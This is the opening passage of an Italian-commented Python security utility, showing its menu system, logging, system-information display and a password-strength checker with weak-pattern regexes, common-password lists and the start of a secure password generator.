#!/usr/bin/env python3

"""
Enhanced Security Tool
Una suite ''completa'' di strumenti per l'analisi della sicurezza
Versione: 2.2
"""

# Librerie di sistema
import os
import sys
import math
import threading
import queue
import json
import csv
import asyncio
import gc
from datetime import datetime
from collections import defaultdict
from functools import lru_cache
from logging.handlers import RotatingFileHandler

# Librerie di rete
import socket
import ssl
import requests
import paramiko
import psutil
import ipaddress

# Librerie di crittografia e sicurezza
import hashlib
import secrets
import random
import string

# Librerie di utilità
import statistics
from typing import Callable, Dict, List, Optional, Tuple, Union, Set  # Aggiungi Set
import re
from urllib.parse import urlparse
import time
from scapy.all import sr1, IP, ICMP

# Costanti globali
DEBUG_MODE = False  # Abilita/disabilita output di debug
PROGRAM_VERSION = "2.2"  # Versione del programma

# Costanti per retry mechanism
MAX_RETRIES = 3
INITIAL_RETRY_DELAY = 1  # secondi

# Configurazione logging
import logging
import sys  # Assicurati di importare sys se lo stai usando

# Configura il logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security_tool.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger(__name__)

class LogManager:
    def __init__(self, name: str):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        
        # Remove existing handlers to avoid duplicates
        if self.logger.handlers:
            self.logger.handlers.clear()
        
        # File handler with rotation
        file_handler = RotatingFileHandler(
            'security_tool.log',
            maxBytes=10*1024*1024,  # 10MB
            backupCount=5,
            encoding='utf-8'
        )
        
        # Console handler
        console_handler = logging.StreamHandler(sys.stdout)
        
        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
        
    def info(self, msg: str) -> None:
        self.logger.info(msg)
        
    def error(self, msg: str, exc_info: bool = True) -> None:
        self.logger.error(msg, exc_info=exc_info)
        
    def warning(self, msg: str) -> None:
        self.logger.warning(msg)
        
    def debug(self, msg: str) -> None:
        self.logger.debug(msg)

# Configurazione timeout globale per le richieste
TIMEOUT = 10

# Configurazione colori per output
class Colors:
    HEADER = '\033[95m'
    INFO = '\033[94m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    DANGER = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_colored(text: str, color: str) -> None:
    """Stampa testo colorato"""
    print(f"{color}{text}{Colors.ENDC}")

def print_banner() -> None:
    """Stampa il banner del programma"""
    banner = f"""
╔════════════════════════════════════════════╗
║       Enhanced Security Tool v{PROGRAM_VERSION}          ║
║         Security Analysis Suite            ║
╚════════════════════════════════════════════╝
    """
    print_colored(banner.strip(), Colors.HEADER)



class ExceptionHandler:
    """Gestore centralizzato delle eccezioni"""
    @staticmethod
    def handle_exception(e: Exception, context: str) -> None:
        """
        Gestisce le eccezioni in modo centralizzato
        Args:
            e: L'eccezione catturata
            context: Il contesto in cui si è verificata l'eccezione
        """
        error_msg = f"Errore in {context}: {str(e)}"
        logger.error(error_msg)
        if DEBUG_MODE:
            logger.exception(e)
        print_colored(error_msg, Colors.DANGER)

# Classe base per tutti i moduli
class BaseModule:
    def __init__(self):
        self.logger = LogManager(self.__class__.__name__)

    def _log_info(self, message: str) -> None:
        self.logger.info(message)

    def _log_error(self, message: str) -> None:
        self.logger.error(message)

    def _log_warning(self, message: str) -> None:
        self.logger.warning(message)

    def _log_debug(self, message: str) -> None:
        self.logger.debug(message)




































class MenuManager:
    """Gestore centralizzato dei menu"""
    def __init__(self):
        """Inizializza i moduli e gli stati del menu"""
        # Inizializza i moduli
        self.password_manager = PasswordMenu()  # Gestore password
        self.port_scanner = PortScanner()       # Scanner porte di rete
        self.web_tester = WebSecurityTester()   # Tester sicurezza web

        # Monitor di rete: inizializzato solo quando necessario
        self.network_monitor = None

        # Stato dei moduli
        self.modules_status = {
            'network_monitor': False,  # Stato del monitor di rete
            'port_scanner': False     # Stato del port scanner
        }

    def display_header(self, title: str) -> None:
        """Mostra header del menu in modo uniforme"""
        print("\n" + "="*50)
        print(f"{Colors.HEADER}=== {title} ==={Colors.ENDC}")
        print("="*50)

    def display_menu_option(self, number: str, text: str, status: Optional[bool] = None) -> None:
        """Mostra opzione menu con eventuale stato"""
        if status is None:
            print(f"{number}. {text}")
        else:
            status_color = Colors.SUCCESS if status else Colors.WARNING
            status_text = "Attivo" if status else "Non Avviato"
            print(f"{number}. {text} [{status_color}{status_text}{Colors.ENDC}]")

    def show_main_menu(self) -> None:
        """Menu principale migliorato"""
        try:
            while True:
                try:
                    self.display_header(f"Security Analysis Tool v{PROGRAM_VERSION}")
                    
                    # Mostra opzioni con stati
                    self.display_menu_option("1", "Gestione Password")
                    self.display_menu_option("2", "Network Scanner", self.modules_status['port_scanner'])
                    self.display_menu_option("3", "Web Security Tests")
                    self.display_menu_option("4", "Network Monitor", self.modules_status['network_monitor'])
                    self.display_menu_option("5", "Impostazioni")
                    self.display_menu_option("0", "Esci")
                    print("="*50)

                    choice = input("\nScegli un'opzione: ").strip()

                    if choice == "1":
                        self.password_manager.display_menu()

                    elif choice == "2":
                        self.handle_port_scanner()

                    elif choice == "3":
                        self.handle_web_security()

                    elif choice == "5":
                        self.show_settings()

                    elif choice == "0":
                        self.cleanup_and_exit()
                        break
                    
                    elif choice == "4":
                        self.handle_network_monitor()

                    else:
                        print_colored("\nOpzione non valida. Riprova.", Colors.WARNING)

                except KeyboardInterrupt:
                    if input("\nVuoi davvero uscire? (s/N): ").lower().startswith('s'):
                        self.cleanup_and_exit()
                        break
                    continue

        except Exception as e:
            ExceptionHandler.handle_exception(e, "main_menu")
            sys.exit(1)
    
    # Definizione helper per il menu principale
    def password_menu(self) -> None:
        """Inizializza e mostra il menu password"""
        menu = PasswordMenu()
        menu.display_menu()


    def handle_port_scanner(self) -> None:
        """Gestisce l'avvio del port scanner"""
        try:
            print_colored("\nAvvio Network Scanner...", Colors.INFO)
            self.modules_status['port_scanner'] = True
            asyncio.run(self.port_scanner.menu())
        finally:
            self.modules_status['port_scanner'] = False

    def handle_web_security(self) -> None:
        """Gestisce l'avvio dei test di sicurezza web"""
        print_colored("\nAvvio Web Security Tests...", Colors.INFO)
        web_tester = WebSecurityTester()
        web_security_menu()

    def handle_network_monitor(self):
        """Gestisce l'avvio del monitor di rete con output continuo"""
        try:
            if self.network_monitor is None:
                self.network_monitor = NetworkMonitor()  # Crea l'istanza solo se necessario

            print_colored("\nAvvio Network Monitor...", Colors.INFO)
            self.modules_status['network_monitor'] = True
            self.network_monitor.start_monitoring()  # Avvia il monitoraggio

            # LOOP PER MOSTRARE I RISULTATI LIVE
            while self.modules_status['network_monitor']:
                try:
                    event = self.network_monitor.get_latest_event()  # Ottiene i dati dal monitor
                    if event:
                        print(event)
                    time.sleep(1)  # Evita di sovraccaricare l'output
                except KeyboardInterrupt:
                    print("\nInterruzione richiesta. Arresto del Network Monitor...")
                    self.modules_status['network_monitor'] = False
                    self.network_monitor.stop_monitoring()
                    break
        except Exception as e:
            ExceptionHandler.handle_exception(e, "network_monitor")
        finally:
            self.modules_status['network_monitor'] = False


    def cleanup_and_exit(self) -> None:
        """
        Pulisce le risorse prima dell'uscita in modo sicuro con timeout
        per evitare hang dei threads.
        """
        print_colored("\nChiusura del programma in corso...", Colors.INFO)

        try:
            SHUTDOWN_TIMEOUT = 5  # Timeout per l'arresto dei servizi

            # Ferma il Network Monitor se attivo
            if self.modules_status.get('network_monitor', False):
                print_colored("Arresto Network Monitor...", Colors.INFO)
                try:
                    if self.network_monitor:
                        self.network_monitor.stop_monitoring()
                        if hasattr(self.network_monitor, 'traffic_thread') and self.network_monitor.traffic_thread.is_alive():
                            self.network_monitor.traffic_thread.join(timeout=SHUTDOWN_TIMEOUT)
                        if hasattr(self.network_monitor, 'connections_thread') and self.network_monitor.connections_thread.is_alive():
                            self.network_monitor.connections_thread.join(timeout=SHUTDOWN_TIMEOUT)
                except TimeoutError:
                    print_colored("Timeout durante l'arresto del Network Monitor", Colors.WARNING)

            # Ferma il Port Scanner se attivo
            if self.modules_status.get('port_scanner', False):
                print_colored("Arresto Port Scanner...", Colors.INFO)
                try:
                    if self.port_scanner:
                        self.port_scanner.stop_scan()
                        if hasattr(self.port_scanner, 'scan_thread') and self.port_scanner.scan_thread.is_alive():
                            self.port_scanner.scan_thread.join(timeout=SHUTDOWN_TIMEOUT)
                except TimeoutError:
                    print_colored("Timeout durante l'arresto del Port Scanner", Colors.WARNING)

            # Salva le configurazioni con gestione del timeout
            print_colored("Salvataggio configurazioni...", Colors.INFO)
            try:
                config_thread = threading.Thread(target=self.save_config)
                config_thread.start()
                config_thread.join(timeout=SHUTDOWN_TIMEOUT)
                if config_thread.is_alive():
                    print_colored("Timeout durante il salvataggio delle configurazioni", Colors.WARNING)
            except Exception as e:
                print_colored(f"Errore durante il salvataggio configurazioni: {str(e)}", Colors.WARNING)

            # Chiusura dei logger per evitare memory leaks
            print_colored("Chiusura file di log...", Colors.INFO)
            for handler in logger.handlers[:]:
                handler.close()
                logger.removeHandler(handler)
            logging.shutdown()

            # Libera la memoria
            print_colored("Pulizia memoria...", Colors.INFO)
            self.clear_memory()

            print_colored("Chiusura completata con successo!", Colors.SUCCESS)

        except Exception as e:
            ExceptionHandler.handle_exception(e, "cleanup_and_exit")
            print_colored("Errore durante la chiusura del programma!", Colors.DANGER)

        finally:
            # Forza la chiusura di eventuali thread rimasti
            remaining_threads = [t for t in threading.enumerate() if t != threading.current_thread()]
            if remaining_threads:
                print_colored(f"Forza chiusura di {len(remaining_threads)} thread rimasti", Colors.WARNING)
                for thread in remaining_threads:
                    try:
                        if thread.is_alive():
                            thread.join(timeout=2)
                    except Exception as e:
                        print_colored(f"Errore nella chiusura del thread {thread.name}: {e}", Colors.WARNING)

            # Chiudi le connessioni di rete aperte
            try:
                import socket
                for conn in list(socket.socket._active):  # Evita RuntimeError
                    try:
                        conn.close()
                    except Exception:
                        pass
            except Exception:
                pass

            # Aspetta un breve momento per permettere la chiusura pulita
            time.sleep(0.5)

            # Imposta i flag di stato finali
            self.modules_status = {
                'network_monitor': False,
                'port_scanner': False
            }

            # Reset delle variabili di classe per prevenire memory leaks
            self.password_manager = None
            self.port_scanner = None
            self.web_tester = None
            self.network_monitor = None

            # Forza il garbage collector
            try:
                import gc
                gc.collect()
            except Exception:
                pass

            # Log finale
            logger.info("Programma terminato con successo")
            sys.exit(0)

  
    def save_config(self) -> None:
        """Salva le configurazioni correnti"""
        try:
            config_file = "config.json"  # Definizione esplicita del file di configurazione
            
            config = {
                'DEBUG_MODE': DEBUG_MODE,
                'last_settings': {
                    'network_monitor': self.modules_status['network_monitor'],
                    'port_scanner': self.modules_status['port_scanner']
                }
            }

            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            
        except Exception as e:
            ExceptionHandler.handle_exception(e, "save_config")


    def clear_memory(self) -> None:
        """Libera la memoria utilizzata"""
        try:
            # Reset delle variabili di classe
            self.modules_status.clear()
            
            # Rimuovi riferimenti ciclici
            self.password_manager = None
            self.port_scanner = None
            self.web_tester = None
            self.network_monitor = None
            
            # Forza garbage collection
            import gc
            gc.collect()
            
        except Exception as e:
            ExceptionHandler.handle_exception(e, "clear_memory")

    def show_settings(self) -> None:
        """Mostra e gestisce le impostazioni del programma"""
        global DEBUG_MODE
        while True:
            try:
                self.display_header("Impostazioni")
                self.display_menu_option("1", f"Modalità Debug: {'Attiva' if DEBUG_MODE else 'Disattiva'}", DEBUG_MODE)
                self.display_menu_option("2", "Mostra versione")
                self.display_menu_option("3", "Mostra informazioni di sistema")
                self.display_menu_option("4", "Verifica dipendenze")
                self.display_menu_option("0", "Torna al menu principale")
                
                choice = input("\nScegli un'opzione: ").strip()
                
                if choice == "1":
                    DEBUG_MODE = not DEBUG_MODE
                    status = "attivata" if DEBUG_MODE else "disattivata"
                    print_colored(f"\nModalità Debug {status}", 
                                Colors.SUCCESS if DEBUG_MODE else Colors.WARNING)
                    logger.setLevel(logging.DEBUG if DEBUG_MODE else logging.INFO)
                    
                elif choice == "2":
                    print_colored(f"\nSecurity Analysis Tool v{PROGRAM_VERSION}", Colors.HEADER)
                    print("Sviluppato per analisi di sicurezza")
                    print("Copyright (c) 2024")
                    
                elif choice == "3":
                    self.show_system_info()
                    
                elif choice == "4":
                    self.check_dependencies()
                    
                elif choice == "0":
                    break
                    
                else:
                    print_colored("\nOpzione non valida. Riprova.", Colors.WARNING)
                    
                input("\nPremi INVIO per continuare...")
                
            except Exception as e:
                ExceptionHandler.handle_exception(e, "settings_menu")
                input("\nPremi INVIO per continuare...")    

    def show_system_info(self) -> None:
        """Mostra informazioni dettagliate sul sistema"""
        self.display_header("Informazioni di Sistema")
        
        try:
            # Info Sistema Operativo
            print(f"Sistema Operativo: {os.name}")
            print(f"Python Version: {sys.version.split()[0]}")
            
            # CPU Info
            cpu_usage = psutil.cpu_percent()
            cpu_count = psutil.cpu_count()
            cpu_freq = psutil.cpu_freq()
            print("\nCPU:")
            print(f"- Utilizzo: {Colors.WARNING if cpu_usage > 70 else Colors.SUCCESS}{cpu_usage}%{Colors.ENDC}")
            print(f"- Core: {cpu_count}")
            if cpu_freq:
                print(f"- Frequenza: {cpu_freq.current:.2f} MHz")
            
            # Memoria Info
            mem = psutil.virtual_memory()
            print("\nMemoria:")
            print(f"- Totale: {self._format_bytes(mem.total)}")
            print(f"- Disponibile: {self._format_bytes(mem.available)}")
            print(f"- Utilizzo: {Colors.WARNING if mem.percent > 70 else Colors.SUCCESS}{mem.percent}%{Colors.ENDC}")
            
            # Disco Info
            disk = psutil.disk_usage('/')
            print("\nDisco:")
            print(f"- Totale: {self._format_bytes(disk.total)}")
            print(f"- Libero: {self._format_bytes(disk.free)}")
            print(f"- Utilizzo: {Colors.WARNING if disk.percent > 85 else Colors.SUCCESS}{disk.percent}%{Colors.ENDC}")
            
            # Network Info
            net = psutil.net_if_stats()
            print("\nNetwork Interfaces:")
            for interface, stats in net.items():
                print(f"- {interface}: {'Up' if stats.isup else 'Down'}")
                
        except Exception as e:
            ExceptionHandler.handle_exception(e, "show_system_info")

    def check_dependencies(self) -> None:
        """Verifica la presenza e versione delle dipendenze necessarie"""
        self.display_header("Verifica Dipendenze")
        
        dependencies = {
            'psutil': '5.8.0',
            'requests': '2.26.0',
            'paramiko': '2.8.0',
            'cryptography': '3.4.0',
            'asyncio': '3.4.3'
        }
        
        all_ok = True
        print("="*40)
        
        for package, min_version in dependencies.items():
            try:
                imported = __import__(package)
                current_version = getattr(imported, '__version__', 'Unknown')
                
                if current_version != 'Unknown':
                    status = "OK" if current_version >= min_version else "Aggiornamento consigliato"
                    status_color = Colors.SUCCESS if current_version >= min_version else Colors.WARNING
                    print(f"{package}: v{current_version} ({status_color}{status}{Colors.ENDC})")
                    
                    if current_version < min_version:
                        all_ok = False
                        print(f"  → Versione minima consigliata: v{min_version}")
                else:
                    print(f"{package}: Versione {current_version}")
                    
            except ImportError:
                all_ok = False
                print(f"{package}: {Colors.DANGER}Non installato{Colors.ENDC}")
                print(f"  → Installa con: pip install {package}>={min_version}")
        
        print("="*40)
        if all_ok:
            print_colored("\nTutte le dipendenze sono soddisfatte!", Colors.SUCCESS)
        else:
            print_colored("\nAlcune dipendenze necessitano di attenzione.", Colors.WARNING)
            print("Esegui 'pip install -r requirements.txt' per installare/aggiornare")

    def _format_bytes(self, bytes_value: int) -> str:
        """Formatta i bytes in formato leggibile
        
        Args:
            bytes_value: Valore in bytes da formattare
            
        Returns:
            str: Stringa formattata con l'unità appropriata
        """
        try:
            # Valori speciali
            if bytes_value == 0:
                return "0 B"
                
            # Definisci le unità di misura
            units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB']
            
            # Calcola l'indice dell'unità appropriata
            exponent = min(int(math.log(abs(bytes_value), 1024)), len(units) - 1)
            
            # Converti il valore nell'unità appropriata
            value = bytes_value / (1024 ** exponent)
            
            # Determina il numero di decimali in base alla grandezza
            if value >= 100:
                decimals = 0
            elif value >= 10:
                decimals = 1
            else:
                decimals = 2
                
            # Formatta il risultato
            formatted = f"{value:.{decimals}f}"
            
            # Rimuovi gli zeri non necessari dopo il punto
            if '.' in formatted:
                formatted = formatted.rstrip('0').rstrip('.')
                
            return f"{formatted} {units[exponent]}"
            
        except Exception as e:
            self._log_error(f"Errore durante la formattazione dei bytes: {str(e)}")
            return f"{bytes_value} B"  # Fallback in caso di errore




































class PasswordChecker(BaseModule):
    """Modulo avanzato per l'analisi e la generazione di password sicure"""
    
    def __init__(self):
        super().__init__()
        # Inizializza set di parole comuni e pattern
        self.common_words = self._initialize_common_words()
        self.patterns = self._initialize_patterns()
        self.leaked_passwords = self._initialize_leaked_passwords()
        
    def _initialize_patterns(self) -> Dict[str, str]:
        """Inizializza i pattern pericolosi da rilevare"""
        return {
        # SEZIONE 1: Pattern tastiera
        # Pattern di base tastiera
        'keyboard_horizontal': r'(?i)(qwerty|azerty|qwertz|asdfgh|zxcvbn)',
        'keyboard_vertical': r'(?i)(qazwsx|wsxedc|edcrfv|rfvtgb|tgbyhn|yhnujm)',
        'keyboard_diagonal': r'(?i)(qawsed|waserd|esdzfc|rdfcvg|tfcvbg)',
        'keyboard_layouts': r'(?i)(qwerty|azerty|qwertz|dvorak)',
        'keyboard_numpad': r'(?:789|456|123|741|852|963|159|357)',
        'keyboard_patterns_games': r'(?i)(wasd|zqsd|arrow)',
        
        # SEZIONE 2: Pattern numerici
        # Sequenze numeriche e date
        'numbers_sequential': (
            r'(?:0123|1234|2345|3456|4567|5678|6789|9876|8765|7654|6543|5432|4321|3210|'
            r'01234|12345|23456|34567|45678|56789|98765|87654|76543|65432|54321|43210|'
            r'012345|123456|234567|345678|456789|987654|876543|765432|654321|543210)'
        ),
        'common_numbers': r'(?:123|456|789|987|654|321|000|111|222|333|444|555|666|777|888|999)',
        'numpad_patterns': r'(?:123|456|789|147|258|369|159|357)',
        'incremental_numbers': r'\d+(?:\+\d+)+',
        'decremental_numbers': r'\d+(?:-\d+)+',

        # SEZIONE 3: Pattern alfabetici e sequenze
       'letters_sequential': (
           r'(?i)(?:abcd|bcde|cdef|defg|efgh|fghi|ghij|hijk|ijkl|jklm|klmn|lmno|mnop|'
           r'nopq|opqr|pqrs|qrst|rstu|stuv|tuvw|uvwx|vwxy|wxyz|'
           r'zyxw|yxwv|xwvu|wvut|vuts|utsr|tsrq|srqp|rqpo|qpon|ponm|onml|nmlk|mlkj|lkji|'
           r'kjih|jihg|ihgf|hgfe|gfed|fedc|edcb|dcba)'
       ),
       'repeated_chars': r'(.)\1{2,}',  # Caratteri ripetuti più di 2 volte
       'repeated_sequences': r'(.{2,})\1{2,}',  # Sequenze ripetute più volte
       'alternating_sequences': r'([a-zA-Z0-9])([a-zA-Z0-9])\1\2{2,}',  # Come 'abab'
       'letter_number': r'[a-zA-Z]\d|\d[a-zA-Z]',  # Combinazione semplice lettera-numero

       # SEZIONE 4: Date e anni
       'dates': (
           r'(?:\d{1,2}[-/.]\d{1,2}[-/.]\d{2,4}|'
           r'\d{4}[-/.]\d{1,2}[-/.]\d{1,2}|'
           r'\d{1,2}(?:0[1-9]|1[0-2])\d{2,4}|'
           r'\d{2,4}(?:0[1-9]|1[0-2])\d{1,2})'
       ),
       'years': r'(?:19\d{2}|20\d{2}|[12]\d{3})',
       'special_dates': r'(?:\d{1,2}(?:0[1-9]|1[0-2])(?:19|20)\d{2})',
       'birthdays': r'(?:(?:0[1-9]|[12]\d|3[01])(?:0[1-9]|1[0-2])\d{2,4})',

       # SEZIONE 5: Pattern linguistici inglesi
       'english_common_words': r'(?i)(password|welcome|login|admin|user|guest|default)',
       'english_business': r'(?i)(office|work|company|business|employee|manager|staff)',
       'english_tech': r'(?i)(computer|laptop|phone|tablet|network|server|system)',
       'english_personal': r'(?i)(family|friend|love|baby|honey|sweet|dear)',
       'english_sports': r'(?i)(football|soccer|baseball|basketball|tennis|golf)',
       'english_locations': r'(?i)(london|york|paris|rome|tokyo|berlin|madrid)',
       
       # SEZIONE 6: Pattern linguistici italiani
       'italian_common': (
           r'(?i)(?:password|chiave|accesso|ingresso|codice|'
           r'segreto|privato|sicuro|protetto|'
           r'entrare|uscire|aprire|chiudere|aperto|chiuso|'
           r'permesso|vietato|autorizzato|cancello|porta)'
       ),
       
       'italian_affective': (
           r'(?i)(?:amore|tesoro|cuore|vita|stella|sole|luna|cielo|'
           r'angelo|principessa|principe|bambino|bambina|'
           r'dolce|caro|cara|bello|bella|piccolo|piccola)'
       ),
       
       'italian_names': (
           r'(?i)(?:mario|luigi|giuseppe|giovanni|antonio|paolo|'
           r'maria|anna|laura|sara|giulia|marco|andrea|'
           r'francesco|alessandro|roberto|stefano|michele)'
       ),

        # SEZIONE 7: Pattern italiani specifici
       'italian_sports': (
           r'(?i)(?:juve|juventus|milan|inter|roma|napoli|lazio|'
           r'ferrari|ducati|valentino|rossi|mondiale|'
           r'calcio|tennis|basket|pallavolo|nuoto|ciclismo)'
       ),
       
       'italian_cities': (
           r'(?i)(?:roma|milano|napoli|firenze|venezia|torino|'
           r'bologna|palermo|genova|padova|verona|'
           r'sicilia|sardegna|toscana|lombardia|piemonte|puglia)'
       ),
       
       'italian_professions': (
           r'(?i)(?:dottore|medico|avvocato|ingegnere|architetto|'
           r'professore|maestro|studente|operaio|impiegato|'
           r'commerciante|artista|musicista|attore|regista)'
       ),

       'italian_business': (
           r'(?i)(?:azienda|ufficio|lavoro|ditta|società|'
           r'amministrazione|segreteria|direzione|'
           r'vendite|acquisti|magazzino|produzione|'
           r'contratto|fattura|ordine|preventivo|'
           r'cliente|fornitore|dipendente|collaboratore)'
       ),

       # SEZIONE 8: Pattern leet speak e sostituzioni
       'leet_speak_base': (
           r'(?i)(?:p[a@4]ssw[o0]rd|'
           r'[a@4]dm[i1!]n|'
           r'r[o0][o0]t|'
           r'l[o0]g[i1!]n|'
           r'w[e3]lc[o0]m[e3])'
       ),

       # SEZIONE 9: Leet speak avanzato e sostituzioni complesse
       'leet_speak_advanced': (
           r'(?i)(?:[a@4][s5$][e3][c<]|'
           r'[p9][a@4][s5$][s5$]|'
           r'[s5][e3][c<][u|_|]r[e3]|'
           r'[a@4][c<][c<][e3][s5$][s5$]|'
           r'[a@4][d6][m3][i1!][n4])'
       ),
       
       # SEZIONE 10: Pattern di sicurezza e accesso
       'security_terms': (
           r'(?i)(?:secure|protect|safety|guard|shield|defend|'
           r'firewall|encrypt|decrypt|cipher|hash|salt|'
           r'security|privacy|private|public|secret)'
       ),
       
       'access_patterns': (
           r'(?i)(?:access|enter|login|signin|signup|register|'
           r'account|profile|user|admin|root|sudo|'
           r'permission|authorize|authenticate)'
       ),

       # SEZIONE 11: Simboli e sequenze speciali
       'symbol_sequences': r'[!@#$%^&*.,_+\-=]{2,}',
       'mixed_symbols': r'[A-Za-z][!@#$%^&*][0-9]|[0-9][!@#$%^&*][A-Za-z]',
       'common_endings': (
           r'(?:[!@#$%^&*]|\d{1,4}|[A-Za-z]\d|\d[A-Za-z]|'
           r'[!@#](?:\d{1,2}|[A-Za-z]))$'
       ),

       # SEZIONE 12: Pattern contestuali e personali
       'context_patterns': (
           r'(?i)(?:house|home|work|office|school|college|uni|'
           r'game|play|fun|hobby|sport|team|club|group|'
           r'bank|card|account|money|finance|credit|debit)'
       ),
       
       'personal_patterns': (
           r'(?i)(?:birthday|anniversary|wedding|graduation|'
           r'family|brother|sister|mother|father|parent|child|'
           r'pet|cat|dog|bird|fish|animal|favorite)'
       )
   }


    def _initialize_leaked_passwords(self) -> set:
        """Inizializza il set di password compromesse più comuni"""
        return {
            # Top 100 password leaked (aggiornate 2024)
            "123456", "123456789", "qwerty", "password", "12345", "qwerty123", 
            "1q2w3e", "12345678", "111111", "1234567890", "1234567", "abc123",
            "password1", "admin", "welcome123", "monkey123", "football123", "123123",
            "dragon123", "letmein123", "shadow123", "baseball123", "master123",
            # ... (aggiungi altre password leaked comuni)
        }

    def _initialize_common_words(self) -> set:
        """Inizializza il set completo di parole comuni da evitare"""
        
        common_words = {
            # CATEGORIA: Password più comuni (da database breaches)
            "password", "123456", "qwerty", "admin", "welcome", "monkey", "dragon",
            "baseball", "football", "letmein", "master", "hello", "freedom",
            
            # CATEGORIA: Termini tecnici/informatici
            "admin", "root", "user", "guest", "test", "demo", "login", "password",
            "system", "database", "server", "client", "network", "security", "backup",
            "web", "host", "domain", "email", "mail", "proxy", "router", "switch",
            "firewall", "virus", "trojan", "malware", "hacker", "crack", "exploit",
            
            # CATEGORIA: Nomi italiani comuni
            "mario", "luigi", "giovanni", "paolo", "marco", "andrea", "giuseppe",
            "antonio", "maria", "anna", "laura", "sara", "giulia", "rosa", "francesco",
            "alessandro", "stefano", "davide", "simone", "roberto", "alberto",
            "giorgio", "angelo", "bruno", "carlo", "claudio", "daniele", "emilio", "matteo",
            
            # CATEGORIA: Parole italiane comuni
            "ciao", "casa", "amore", "vita", "sole", "luna", "mare", "terra",
            "cielo", "fuoco", "acqua", "aria", "tempo", "giorno", "notte",
            "estate", "inverno", "primavera", "autunno", "anno", "mese",
            "settimana", "lunedi", "martedi", "mercoledi", "giovedi", "venerdi",
            "sabato", "domenica", "gennaio", "febbraio", "marzo", "aprile",
            "maggio", "giugno", "luglio", "agosto", "settembre", "ottobre",
            "novembre", "dicembre",
            
            # CATEGORIA: Brand e social media
            "facebook", "instagram", "twitter", "linkedin", "youtube", "google",
            "microsoft", "apple", "android", "windows", "linux", "ubuntu", "firefox",
            "chrome", "safari", "opera", "whatsapp", "telegram", "signal", "amazon",
            "netflix", "spotify", "playstation", "xbox", "nintendo",
            
            # CATEGORIA: Sport e squadre italiane
            "juventus", "milan", "inter", "roma", "napoli", "lazio", "fiorentina",
            "atalanta", "torino", "sampdoria", "genoa", "bologna", "ferrari",
            "ducati", "yamaha", "honda",
            
            # CATEGORIA: Luoghi italiani
            "italia", "roma", "milano", "napoli", "torino", "firenze", "venezia",
            "bologna", "palermo", "genova", "padova", "verona", "sicilia",
            "sardegna", "toscana", "lombardia", "piemonte", "puglia",
            
            # CATEGORIA: Termini affettivi
            "amore", "tesoro", "cuore", "dolce", "piccolo", "grande", "bello",
            "bella", "caro", "cara", "angelo", "stella", "sole", "vita", "bambino",
            "bambina", "principessa", "principe",
            
            # CATEGORIA: Hobby e interessi
            "musica", "cinema", "teatro", "danza", "pittura", "foto", "sport",
            "calcio", "tennis", "basket", "pallavolo", "nuoto", "bici", "moto",
            "auto", "viaggi", "mare", "montagna", "natura", "animali",
            
            # CATEGORIA: Cibo e bevande
            "pizza", "pasta", "vino", "birra", "caffe", "gelato", "pane",
            "pomodoro", "mozzarella", "lasagna", "risotto", "espresso",
            
            # CATEGORIA: Professioni
            "dottore", "medico", "avvocato", "ingegnere", "architetto",
            "professore", "maestro", "studente", "operaio", "impiegato",
            "commerciante", "artista", "musicista", "attore", "regista",
            
            # CATEGORIA: Numeri comuni
            "uno", "due", "tre", "quattro", "cinque", "sei", "sette", "otto",
            "nove", "dieci", "cento", "mille",
            
            # CATEGORIA: Termini religiosi
            "dio", "gesu", "maria", "santo", "santa", "angelo", "chiesa",
            "madonna", "cristo", "papa", "padre", "madre",
        }

        # Espansione delle varianti
        extended_words = set()
        leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7', 'b': '8', 'g': '9'}
        suffixes = ['1', '12', '123', '2024', '2025', '!']
        symbols = ['!', '@', '#', '$', '%', '*', '.', '_']
        prefixes = ['my', 'il', 'la', 'le', 'i', 'gli', 'the', 'new', 'old', 'super']

        for word in common_words:
            variants = {word.lower(), word.upper(), word.capitalize(), word.title()}
            
            # Varianti con numeri e simboli
            variants.update({f"{word}{s}" for s in suffixes})
            variants.update({f"{word.capitalize()}{s}" for s in suffixes})
            variants.update({f"{word}{s}" for s in symbols})
            variants.update({f"{word.capitalize()}{s}" for s in symbols})
            
            # Varianti leet speak (senza ripetizioni multiple)
            leet_word = ''.join(leet_map.get(c, c) for c in word)
            if leet_word != word:
                variants.add(leet_word)

            # Varianti con prefissi
            variants.update({f"{p}{word}" for p in prefixes})
            variants.update({f"{p}_{word}" for p in prefixes})
            variants.update({f"{p}{word.capitalize()}" for p in prefixes})

            extended_words.update(variants)

        return extended_words


    def generate_secure_password(self, length: int = 16, use_symbols: bool = True) -> str:
        """
        Genera una password sicura che soddisfa tutti i criteri
        
        Args:
            length: Lunghezza desiderata della password (minimo 12)
            use_symbols: Se utilizzare simboli speciali
            
        Returns:
            str: Password generata
            
        Raises:
            ValueError: Se la lunghezza è inferiore a 12
        """
        if length < 12:
            raise ValueError("La lunghezza minima della password deve essere 12 caratteri")
            
        max_attempts = 500  # Aumentato il numero di tentativi per ridurre gli errori
        
        for _ in range(max_attempts):
            # Assicura almeno 3 caratteri per ogni categoria richiesta
            lowercase = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(3))
            uppercase = ''.join(secrets.choice(string.ascii_uppercase) for _ in range(3))
            digits = ''.join(secrets.choice(string.digits) for _ in range(3))
            
            if use_symbols:
                symbols = ''.join(secrets.choice("!@#$%^&*()_+=[]{}|;:,.<>?-") for _ in range(3))
                remaining_length = length - (3 * 4)  # 3 caratteri per ogni categoria
                all_chars = string.ascii_letters + string.digits + "!@#$%^&*()_+=[]{}|;:,.<>?-"
            else:
                symbols = ''
                remaining_length = length - (3 * 3)  # Solo lettere e numeri
                all_chars = string.ascii_letters + string.digits
            
            # Garantisce che `remaining_length` sia sempre >= 0
            remaining_length = max(0, remaining_length)

